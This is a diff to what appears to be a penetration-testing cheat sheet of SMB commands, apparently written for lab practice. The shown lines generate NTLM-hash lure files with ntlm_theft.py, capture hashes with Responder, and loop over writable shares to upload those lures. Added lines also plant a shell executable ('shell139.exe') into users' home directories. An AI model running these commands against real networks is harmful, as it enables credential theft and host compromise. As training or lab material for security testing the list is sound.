@@ -28,8 +28,9 @@ smbclient —kerberos //$dc/share
 cd /opt/ntlm_theft # If writable shares
 python ntlm_theft.py -g all -s $myip -f site
 sudo responder -I tun0 -d -w
-for file in $(ls .); do smbclient -U $user%$pass //$ip/Shared -c "put $file"; done
-
+for file in $(ls .); do smbclient -U $user%$pass //$ip/Shared -c "put $file"; done # put all files in local directory in share root
+for d in $(cat dirs.txt); do smbclient -U $user%$pass //$ip/homes -c "prompt OFF; recurse ON; cd /$d; lcd /home/kali/practice/hok/theft; mput *" ; wait ; done
+for d in $(cat dirs.txt); do smbclient -U $user%$pass //$ip/homes -c "prompt OFF; recurse ON; cd /$d; lcd /home/kali/practice/hok/theft; put shell139.exe"; wait ; done
 smbclient.py $dom
 smbclient -W WORKGROUP -U % -t 5 -L //$dom -g
 smbclient -W WORKGROUP -U % -s /tmp/tmpm24idfat -t 5 -L //192.168.154.117 -g
